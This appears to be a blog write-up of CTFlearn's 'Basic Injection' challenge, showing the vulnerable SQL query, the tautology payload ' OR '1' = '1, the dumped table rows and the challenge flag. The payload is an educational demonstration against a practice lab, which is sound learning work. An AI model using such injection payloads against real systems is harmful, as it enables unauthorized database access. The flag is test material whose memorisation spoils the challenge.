---
title: "Basic Injection"
categories:
  - CTFlearn
tags:
  - CTFlearn
  - web
---

See if you can leak the whole database using what you know about SQL Injections. [link](https://web.ctflearn.com/web4/)

Don't know where to begin? Check out CTFlearn's [SQL Injection Lab](https://ctflearn.com/lab/sql-injection-part-1)

Solution: 

Original Query: `SELECT * FROM webfour.webfour where name = '$input'`

The input isnt sanitized so you can get all the data from the table by first completing part of the query with `'` and then using the or condition with a true statement such as '1'='1'.

In this case you can do it as `' OR '1' = '1` . You dont need the last ' because it already finishes it.


```
Original Query: SELECT * FROM webfour.webfour where name = '$input'

Your Resulting Query: SELECT * FROM webfour.webfour where name = '' OR '1' = '1'

Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```

And there's the flag.

Flag: `CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}`